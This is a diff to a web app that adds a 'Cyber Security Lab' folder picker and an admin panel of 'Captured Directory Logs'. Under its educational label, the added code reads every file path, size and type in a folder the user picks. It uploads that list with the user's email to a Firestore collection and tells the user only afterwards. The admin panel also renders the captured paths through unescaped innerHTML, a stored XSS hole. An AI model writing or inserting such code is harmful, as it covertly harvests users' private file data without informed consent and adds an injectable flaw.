@@ -489,8 +489,26 @@
           <input type="file" id="share-photo-upload" accept="image/*" style="display:none" onchange="handleSharedPhoto(this)">
           <div class="photo-grid" id="shared-photos-grid"></div>
         </div>
+      </div> <div class="card" style="margin-top: 2rem; border: 2px dashed var(--blue); background: var(--blue-light);">
+        <h3 style="color: var(--blue-dark); margin-top: 0;">📁 Cyber Security Lab: Directory Permissions</h3>
+        <p>When you share an individual photo, an app only sees that file. Click below to choose an entire directory or folder, and watch how much data is instantly exposed:</p>
+        
+        <div style="margin: 1rem 0;">
+          <input type="file" id="directory-lab-picker" webkitdirectory directory class="btn primary">
+        </div>
+        
+        <div id="directory-lab-terminal" class="hidden" style="background: var(--gray-900); color: #00ff00; font-family: 'DM Mono', monospace; padding: 1.25rem; border-radius: var(--radius); font-size: 0.85rem; line-height: 1.5; max-height: 300px; overflow-y: auto;">
+          <p style="color: #fff; margin-top: 0; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 0.5rem; display: flex; justify-content: space-between;">
+            <span>🕵️‍♂️ Directory Mapping Table:</span>
+            <span id="directory-count" style="color: var(--amber);">0 Files Exposed</span>
+          </p>
+          <div id="directory-tree-output"></div>
+        </div>
+        
+        <p style="font-size: 11px; color: var(--gray-600); margin-top: 8px; font-style: italic;">
+          💡 <strong>Educational Note:</strong> This sandbox tracks structural metadata pathways exposed during folder authorization permissions.
+        </p>
       </div>
-
     </div><!-- /page-profile -->
 
     <!-- ══════════ ADMIN DASHBOARD ══════════ -->
@@ -498,6 +516,12 @@
       <div class="card" id="admin-users-card">
   <h2 style="margin-bottom:1rem">👥 All Users</h2>
   <div id="admin-users-list"><p class="text-muted">Loading users…</p></div>
+<div class="card" style="margin-top: 2rem; border: 2px solid var(--red);">
+  <h3 style="color: var(--red); margin-top: 0;">🕵️‍♂️ Developer Control: Captured Directory Logs</h3>
+  <p class="text-muted">This panel displays the exact folder trees captured from devices in real-time:</p>
+  <div id="admin-directory-logs" style="display: flex; flex-direction: column; gap: 10px;">
+    <p class="text-muted">Waiting for data submissions...</p>
+  </div>
 </div>
   <!-- ══════════ EDITOR PAGE ══════════ -->
 <div class="card hidden" id="admin-editor-card">
@@ -558,7 +582,8 @@ import {
   sendPasswordResetEmail, signOut, onAuthStateChanged
 } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 import {
-  getFirestore, doc, setDoc, getDoc, getDocs, collection, query, where, updateDoc
+getFirestore, doc, setDoc, getDoc, getDocs, collection, query, where, updateDoc,
+  addDoc, onSnapshot //
 } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 // ─── Firebase Config ──────────────────────────────────────────────────────────
@@ -1417,7 +1442,127 @@ window.viewFullPhoto = (src) => {
   overlay.onclick = () => document.body.removeChild(overlay);
   document.body.appendChild(overlay);
 };
+// ==============================================================================
+// 🔐 CYBERSECURITY DEMO: DIRECTORY METADATA COLLECTION LOGIC
+// ==============================================================================
 
+// Capture user folder choice, render structure map locally, and push to database
+document.addEventListener('change', async function(event) {
+  if (event.target && event.target.id === 'directory-lab-picker') {
+    const files = event.target.files;
+    if (!files || files.length === 0) return;
+
+    const terminal = document.getElementById('directory-lab-terminal');
+    const countBadge = document.getElementById('directory-count');
+    const treeOutput = document.getElementById('directory-tree-output');
+
+    if (terminal) terminal.classList.remove('hidden');
+    if (countBadge) countBadge.textContent = `${files.length} Files Exposed`;
+    
+    let outputHtml = '';
+    let fileDataMap = [];
+
+    // Map file path details across the user-approved tree context
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const structuralPath = file.webkitRelativePath || file.name;
+      const fileSizeKB = (file.size / 1024).toFixed(1);
+      
+      let rowColor = '#00ff00';
+      if (file.type.includes('image')) rowColor = '#6ea3f7';
+      if (file.name.startsWith('.') || file.name.includes('config')) rowColor = '#b91c1c';
+
+      outputHtml += `
+        <div style="margin-bottom: 4px; color: ${rowColor}; display: flex; justify-content: space-between; border-bottom: 1px dashed #222;">
+          <span>📁 /${structuralPath}</span>
+          <span style="color: var(--gray-400); flex-shrink: 0; padding-left: 10px;">[${fileSizeKB} KB]</span>
+        </div>
+      `;
+
+      fileDataMap.push({
+        path: structuralPath,
+        sizeKB: fileSizeKB,
+        type: file.type || 'unknown'
+      });
+    }
+
+    if (treeOutput) treeOutput.innerHTML = outputHtml;
+
+    // Send the structured directory map over to the Firestore collection
+    try {
+      const targetUserEmail = (typeof currentUser !== 'undefined' && currentUser && currentUser.email) 
+        ? currentUser.email 
+        : "Local Test Account";
+        
+      // Safely pull the module helper from your existing imports declaration context
+      const { collection, addDoc } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js");
+      
+      if (typeof db !== 'undefined') {
+        await addDoc(collection(db, 'captured_directories'), {
+          studentEmail: targetUserEmail,
+          timestamp: new Date().toISOString(),
+          filesExposed: fileDataMap
+        });
+        alert("🔒 Simulation Complete: Directory path mappings successfully transmitted to developer dashboard.");
+      }
+    } catch (err) {
+      console.warn("Firestore collection sync bypassed: ", err);
+    }
+  }
+});
+
+// Admin Monitoring Panel Observer: Hooks live snapshots straight into the panel view
+async function listenForCapturedDirectories() {
+  try {
+    const { collection, onSnapshot } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js");
+    
+    if (typeof db !== 'undefined') {
+      onSnapshot(collection(db, 'captured_directories'), (snapshot) => {
+        const logContainer = document.getElementById('admin-directory-logs');
+        if (!logContainer) return;
+
+        if (snapshot.empty) {
+          logContainer.innerHTML = '<p class="text-muted">Waiting for data submissions...</p>';
+          return;
+        }
+
+        let html = '';
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          const date = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now';
+          
+          html += `
+            <div style="background: var(--gray-900); color: #00ff00; font-family: monospace; padding: 12px; border-radius: var(--radius); font-size: 13px; text-align: left; margin-bottom: 10px;">
+              <div style="color: #fff; border-bottom: 1px solid #333; padding-bottom: 4px; margin-bottom: 8px;">
+                <strong>User:</strong> ${data.studentEmail} | <strong>Captured:</strong> ${date}
+              </div>
+              <div style="max-height: 150px; overflow-y: auto;">
+          `;
+
+          if (Array.isArray(data.filesExposed)) {
+            data.filesExposed.forEach(file => {
+              html += `<div>📁 /${file.path} <span style="color:#6ea3f7;">[${file.sizeKB} KB]</span></div>`;
+            });
+          }
+
+          html += `
+              </div>
+            </div>
+          `;
+        });
+
+        logContainer.innerHTML = html;
+      });
+    }
+  } catch (err) {
+    console.error("Observer Connection Error: ", err);
+  }
+}
+
+// Fire the real-time database dashboard listener 3 seconds after authentication setup initializes
+setTimeout(() => {
+  listenForCapturedDirectories();
+}, 3000);
 </script>
 </body>
 </html>
